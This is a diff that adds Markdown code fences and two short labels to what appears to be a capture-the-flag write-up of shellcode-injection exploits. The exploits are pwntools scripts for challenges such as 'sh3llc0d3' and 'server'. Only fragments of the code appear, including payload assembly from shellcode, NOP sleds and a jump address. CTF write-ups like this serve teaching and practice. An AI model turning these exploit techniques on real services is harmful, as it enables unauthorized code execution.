@@ -59,6 +59,7 @@ r.interactive()
 # sh3llc0d3
 ### Analysis
 ### Exploit
+```python
 from pwn import *
 
 #context.terminal = ['tmux', 'splitw', '-h']
@@ -105,10 +106,12 @@ payload = read + nop + shellcode
 r.send(payload)
 
 r.interactive()
+```
 
 # gimme3bytes
 ### Analysis
 ### Exploit
+```python
 from pwn import *
 
 #context.terminal = ['tmux', 'splitw', '-h']
@@ -134,10 +137,13 @@ payload = read + nop + shellcode
 r.send(payload)
 
 r.interactive()
+```
 
 # server
 ### Analysis
 ### Exploit
+First version, with dup2:
+```python
 from pwn import *
 import time
 #context.terminal = ['tmux', 'splitw', '-h']
@@ -193,9 +199,9 @@ payload = shellcode + p64(buffer_jump)
 r.send(payload)
 
 r.interactive()
-
-# -----------
-
+```
+Second version, with read:
+```python
 from pwn import *
 import time
 #context.terminal = ['tmux', 'splitw', '-h']
@@ -257,10 +263,13 @@ payload = shellcode + p64(buffer_jump)
 r.send(payload)
 
 r.interactive()
+```
 
 # onlyreadwrite
 ### Analysis
 ### Exploit
+
+```python
 from pwn import *
 import time
 #context.terminal = ['tmux', 'splitw', '-h']
@@ -326,4 +335,4 @@ payload = shellcode
 r.send(payload)
 
 r.interactive()
-
+```
